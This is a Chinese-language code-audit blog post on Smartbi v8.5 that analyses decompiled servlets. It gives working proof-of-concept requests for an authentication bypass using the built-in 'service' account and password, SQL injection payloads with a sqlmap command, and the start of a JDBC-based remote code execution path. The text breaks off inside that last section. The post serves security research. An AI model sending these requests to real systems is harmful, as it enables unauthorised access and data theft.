    <content type="html"><![CDATA[<h1 id="Smartbi-v8-5-代码审计"><a href="#Smartbi-v8-5-代码审计" class="headerlink" title="Smartbi v8.5 代码审计"></a>Smartbi v8.5 代码审计</h1><h1 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h1><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">E:.<br>├─Infobright用于分析型数据存储<br>├─jdkJava 开发环境<br>├─MySQL数据库服务<br>├─SmartbiUnionServerSmartbi 的 Union Server 模块（Presto 引擎相关）<br>├─smartbixmlaSmartbi XMLA 接口模块，主要用于与外部如 Excel 的数据透视表通信<br>└─TomcatSmartbi 使用的 Web 应用服务器，部署了核心 web 模块和插件扩展<br>    ├─bin包含Tomcat的启动/关闭脚本、Smartbi 的配置文件、运行日志<br>    |<span class="hljs-string">   </span>|<span class="hljs-string">  exts-smartbi扩展模块</span><br><span class="hljs-string">    </span>|<span class="hljs-string"></span>|<span class="hljs-string">  Index-smartbi搜索索引</span><br><span class="hljs-string">    </span>|<span class="hljs-string"></span>|<span class="hljs-string">  mlogs-smartbi模块级别日志</span><br><span class="hljs-string">    </span>|<span class="hljs-string"></span>|<span class="hljs-string">  SmartbiX-ExtractData 数据导出模块</span><br><span class="hljs-string">    </span>|<span class="hljs-string">   </span>|<span class="hljs-string">  smartbi_repoBackup仓库备份</span><br><span class="hljs-string">    </span>|<span class="hljs-string"></span><br><span class="hljs-string">    ├─conf配置文件所在</span><br><span class="hljs-string">   </span>|<span class="hljs-string">│  catalina.policy</span><br><span class="hljs-string"></span>|<span class="hljs-string">│  catalina.properties</span><br><span class="hljs-string"></span>|<span class="hljs-string">│  context.xml</span><br><span class="hljs-string"></span>|<span class="hljs-string">│  logging.properties</span><br><span class="hljs-string"></span>|<span class="hljs-string">│  server.xml</span><br><span class="hljs-string"></span>|<span class="hljs-string">│  tomcat-users.xml</span><br><span class="hljs-string"></span>|<span class="hljs-string">│  web.xml</span><br><span class="hljs-string"></span>|<span class="hljs-string">│</span><br><span class="hljs-string"></span>|<span class="hljs-string">└─Catalina</span><br><span class="hljs-string">    </span>|<span class="hljs-string">└─localhost</span><br><span class="hljs-string">    ├─lib包含Tomcat运行所需的JAR库文件</span><br><span class="hljs-string">    ├─logs</span><br><span class="hljs-string">    ├─temp</span><br><span class="hljs-string">    ├─webapps实际部署的Web应用程序</span><br><span class="hljs-string">    ├─work Tomcat 运行时自动生成的 JSP 编译缓存</span><br></code></pre></td></tr></table></figure><p>在找源码的过程中，看到该系统使用了 Servlet 框架，理解 Servlet 框架对后续的代码理解有帮助</p><blockquote><p>servlet</p><p><a href="https://86263008.github.io/web2024/back/java/jsp/servlet/index.html">https://86263008.github.io/web2024/back/java/jsp/servlet/index.html</a></p><p><a href="https://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11">https://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11</a></p><p><a href="https://blog.csdn.net/yxmoar/article/details/109889006">https://blog.csdn.net/yxmoar/article/details/109889006</a></p></blockquote><h1 id="历史漏洞："><a href="#历史漏洞：" class="headerlink" title="历史漏洞："></a>历史漏洞：</h1><h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><blockquote><p>Smartbi 身份认证绕过漏洞</p><p><a href="https://www.freebuf.com/vuls/373015.html">https://www.freebuf.com/vuls/373015.html</a></p></blockquote><p>网上的 身份认证&#x2F;内置用户登陆 绕过的代码和v8.5版本的有一些区别，不过还是能跟踪到代码漏洞点</p><p>1、代码分析</p><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\filter\CheckIsLoggedFilter.class</p><p>首先找到 CheckIsLoggedFilter.class 文件的 needToCheck() 方法，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071648181.png" alt="20250801173411982"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">needToCheck</span><span class="hljs-params">(String className, String methodName)</span> &#123;<br>    <span class="hljs-comment">//判断 className 非空且不是 BIConfigService （ BIConfigService 是完全信任的服务类，不需要任何登录校验）</span><br>    <span class="hljs-keyword">if</span> (!StringUtil.isNullOrEmpty(className) &amp;&amp; !className.equals(<span class="hljs-string">&quot;BIConfigService&quot;</span>)) &#123;<br>        <span class="hljs-comment">//如果调用的是 UserService 中的方法，即 methodName 属于&#123;&quot;login&quot;, &quot;loginFor&quot;, &quot;clickLogin&quot;, &quot;loginFromDB&quot;, &quot;logout&quot;, &quot;isLogged&quot;, &quot;isLoginAs&quot;, &quot;checkVersion&quot;, &quot;hasLicense&quot;&#125;</span><br>        <span class="hljs-keyword">if</span> (className.equals(<span class="hljs-string">&quot;UserService&quot;</span>) &amp;&amp; StringUtil.isInArray(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;login&quot;</span>, <span class="hljs-string">&quot;loginFor&quot;</span>, <span class="hljs-string">&quot;clickLogin&quot;</span>, <span class="hljs-string">&quot;loginFromDB&quot;</span>, <span class="hljs-string">&quot;logout&quot;</span>, <span class="hljs-string">&quot;isLogged&quot;</span>, <span class="hljs-string">&quot;isLoginAs&quot;</span>, <span class="hljs-string">&quot;checkVersion&quot;</span>, <span class="hljs-string">&quot;hasLicense&quot;</span>&#125;)) &#123;<br>            <span class="hljs-comment">//则不需要登录验证</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br></code></pre></td></tr></table></figure><p>接下来找找 CheckIsLoggedFilter 是在哪里利用的？</p><p> 找到在web.xml中有我们需要的路由 <code>/vision/RMIServlet</code></p><blockquote><p>看到的文章中都是先知道了 RMIServlet 这个路由，然后找到 CheckIsLoggedFilter </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071652623.png" alt="20250801175223846"></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071652566.png" alt="20250801174751116"></p><p>尝试访问 <a href="http://localhost:18080/smartbi/vision/RMIServlet">http://localhost:18080/smartbi/vision/RMIServlet</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071653701.png" alt="20250801174912101"></p><p>POC：</p><p>主要结构：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:18080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-dts">classN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>UserService<span class="hljs-variable">&amp;</span>methodN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>loginFromDB<span class="hljs-variable">&amp;params</span>=[<span class="hljs-string">&quot;service&quot;</span>,<span class="hljs-string">&quot;0a&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>内置用户（service），口令为0a；public、system可能不存在。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071657532.png" alt="20250806083335304"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071657358.png" alt="20250801175555800"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658122.png" alt="20250801175813702"></p><p>使用hackbar也可以，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658447.png" alt="20250801180133641"></p><p>之后访问 <a href="http://localhost:18080/smartbi/vision/">http://localhost:18080/smartbi/vision/</a></p><p>发现已经进入后台</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658299.png" alt="20250801180228087"></p><h2 id="SQL注入（FileResource）"><a href="#SQL注入（FileResource）" class="headerlink" title="SQL注入（FileResource）"></a>SQL注入（FileResource）</h2><p>FileResource 是用于处理文件的 Servlet</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658975.png" alt="20250802132757662"></p><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\fileresource\FileResourceServlet.class</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658788.png" alt="20250802132840122"></p><p>分析代码：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658880.png" alt="20250802133545296"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">//从请求中获取 resID</span><br>    resID = request.getParameter(<span class="hljs-string">&quot;resId&quot;</span>);<br>    <span class="hljs-comment">//初始化 headerType 为 inline，inline 表示浏览器尝试直接在页面中打开文件（比如 PDF、图片）</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">headerType</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;inline&quot;</span>;<br>    <span class="hljs-comment">//判断操作类型 opType 是 &quot;OPEN&quot; 还是 &quot;DOWNLOAD&quot;</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;OPEN&quot;</span>.equals(opType)) &#123;<br>        actionType = OperationType.FILE_RESOURCE_OPEN;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        actionType = OperationType.FILE_RESOURCE_DOWNLOAD;<br>        headerType = <span class="hljs-string">&quot;attachment&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//使用 Connection 对象创建 Statement，用于执行 SQL </span><br>    <span class="hljs-type">Statement</span> <span class="hljs-variable">stat</span> <span class="hljs-operator">=</span> conn.createStatement();<br>    <span class="hljs-comment">//执行 SQL 查询，从 t_fileresource 表中查找指定 resID 的资源文件信息</span><br>    <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stat.executeQuery(<span class="hljs-string">&quot;select c_content,c_name,c_alias,c_type from t_fileresource where c_id = &#x27;&quot;</span> + resID + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>没有对 resID 参数进行过滤直接使用 executeQuery() 拼接执行sql语句，造成sql注入</strong></p><p>构造payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:18080</span>/smartbi/vision/FileResource?resId=<span class="hljs-number">1</span>&amp;opType=DOWNLOAD<br></code></pre></td></tr></table></figure><p>可以sqlmap跑一下：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://127.0.0.1:18080/smartbi/vision/FileResource?resId=1&amp;opType=DOWNLOAD&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658445.png" alt="20250802140622564"></p><h2 id="SQL注入（RMIServlet）"><a href="#SQL注入（RMIServlet）" class="headerlink" title="SQL注入（RMIServlet）"></a>SQL注入（RMIServlet）</h2><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\repository\FileResourceDAO.class</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659185.png" alt="20250805165508359"></p><p>getFileResource方法接收参数 id ，直接拼接SQl语句查询 t_fileresource 表，没有对 id 进行过滤或者其他的安全措施，存在SQL注入风险</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659316.png" alt="20250805181321541"></p><p>getFileResource方法在URLLinkService中调用：</p><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\client\urllink\URLLinkService.class</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659108.png" alt="20250805181341517"></p><p><strong>漏洞复现：</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-sqf">Content-<span class="hljs-built_in">Type</span>: application/x-www-form-urlencoded</span><br><span class="language-sqf"></span><br><span class="language-sqf"><span class="hljs-built_in">className</span>=UrlLinkService&amp;methodName=getFileResource&amp;<span class="hljs-built_in">params</span>=[<span class="hljs-string">&quot;1&#x27;union select database(),2,3,4,5,6#&quot;</span>]</span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:18080<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=7DDE39A449342C004D2F35ABF13BB5AB<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>99<br><br><span class="language-dts">classN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>UrlLinkService<span class="hljs-variable">&amp;</span>methodN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>getFileResource<span class="hljs-variable">&amp;params</span>=[<span class="hljs-string">&quot;1&#x27;union select database(),2,3,4,5,6#&quot;</span>]</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659622.png" alt="20250805182305339"></p><h2 id="后台rce"><a href="#后台rce" class="headerlink" title="后台rce"></a>后台rce</h2><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\sync\SyncServlet.class</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659333.png" alt="20250802145216052"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!ServletFileUpload.isMultipartContent(request)) &#123;<br>    request.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;type&quot;</span>);<br>    response.setBufferSize(<span class="hljs-number">4096</span>);<br>    <span class="hljs-comment">//type=sqldictsync 时执行</span><br>    <span class="hljs-keyword">if</span> (type.equals(<span class="hljs-string">&quot;sqldictsync&quot;</span>)) &#123;<br>        <span class="hljs-comment">//记录时间</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        <span class="hljs-comment">//数据库连接参数</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbType</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbType&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbServer</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbServer&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbName</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbName&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbUser</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbUser&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbPass</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbPass&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">querySql</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;querySql&quot;</span>);<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">dbNameOnly</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;true&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;dbNameOnly&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">clientId</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">//输出调试日志，记录数据库名、查询语句等</span><br>        log.debug(<span class="hljs-string">&quot;sqldictsync[dbName:&quot;</span> + dbName + <span class="hljs-string">&quot;,dbNameOnly:&quot;</span> + dbNameOnly + <span class="hljs-string">&quot;,querySql:&quot;</span> + querySql + <span class="hljs-string">&quot;]&quot;</span>);<br>        <span class="hljs-comment">//如果 dbNameOnly == true，数据库名和 SQL 进行同步，执行SyncResources</span><br>        <span class="hljs-keyword">if</span> (dbNameOnly) &#123;<br>            clientId = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SyncResources</span>()).synchronize(dbName, querySql);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//否则就完整使用所有连接信息进行数据库连接和 SQL 查询</span><br>            clientId = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SyncResources</span>()).synchronize(dbType, dbServer, dbName, dbUser, dbPass, querySql);<br>        &#125;<br></code></pre></td></tr></table></figure><p>此处的参数 dbType、dbServer、dbName等全部由用户输入，可控且无任何检验、过滤</p><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\sync\SyncResources.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-comment">//接收用户输入的数据库参数</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">synchronize</span><span class="hljs-params">(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String querySql)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//使用 DbUtil.getConnection 创建数据库连接，继续跟进</span><br>    <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DbUtil.getConnection(dbType, dbServer, dbName, dbUser, dbPass, (String)<span class="hljs-literal">null</span>);<br>    <span class="hljs-keyword">if</span> (conn == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(StringUtil.getLanguageValue(<span class="hljs-string">&quot;Incomingconnectionparametererrorestablishconnectionfailed&quot;</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">colsCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;<br>        <span class="hljs-type">Reader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultSetReader</span>(conn, querySql, colsCount);<br>        <span class="hljs-type">DictTree</span> <span class="hljs-variable">tree</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DictTree</span>(reader);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.doSynchronize(tree);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>E:\Smartbi\SmartbiUnionServer\plugin\SmartbiPrestoClickHouseJdbc\smartbiCommon.jar!\smartbi\util\DbUtil.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String driver, String url, String dbUser, String dbPass, String connName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">DefaultConnectionInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultConnectionInfo</span>();<br>    info.setId(UUIDGenerator.generate());<br>    info.setName(connName);<br>    <span class="hljs-comment">// driver 和 url 参数都是从 drvInfo取值</span><br>    info.setDriver(driver);<br>    info.setUrl(url);<br>    info.setUser(dbUser);<br>    info.setPassword(dbPass);<br>    <span class="hljs-comment">//调用 getConnection 方法。执行 jdbc </span><br>    <span class="hljs-keyword">return</span> ConnectionPool.getInstance().getConnection(info);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String connName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">DBType</span> <span class="hljs-variable">driverType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        driverType = DBType.valueOf(dbType.toUpperCase());<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var9) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    String[] drvInfo = translateDriverInfo(driverType, dbServer, dbName);<br>    <span class="hljs-keyword">if</span> (drvInfo == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">DefaultConnectionInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultConnectionInfo</span>();<br>        info.setId(UUIDGenerator.generate());<br>        info.setName(connName);<br>        info.setDriverType(driverType);<br>        info.setDriver(drvInfo[<span class="hljs-number">0</span>]);<br>        info.setUrl(drvInfo[<span class="hljs-number">1</span>]);<br>        info.setUser(dbUser);<br>        info.setPassword(dbPass);<br>        <span class="hljs-keyword">return</span> ConnectionPool.getInstance().getConnection(info);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 translateDriverInfo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String[] translateDriverInfo(DBType dbType, String serverName, String dbName) &#123;<br>    <span class="hljs-keyword">return</span> translateDriverInfo(dbType, serverName, dbName, (String)<span class="hljs-literal">null</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String[] translateDriverInfo(DBType dbType, String serverName, String dbName, String dbEncoding) &#123;<br>    String[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">2</span>];<br>    <span class="hljs-comment">//以 dbType 确定数据库类型</span><br>    <span class="hljs-keyword">switch</span> (dbType) &#123;<br>        <span class="hljs-keyword">case</span> DB2:<br>        <span class="hljs-keyword">case</span> DB2_400:<br>            result[<span class="hljs-number">0</span>] = <span 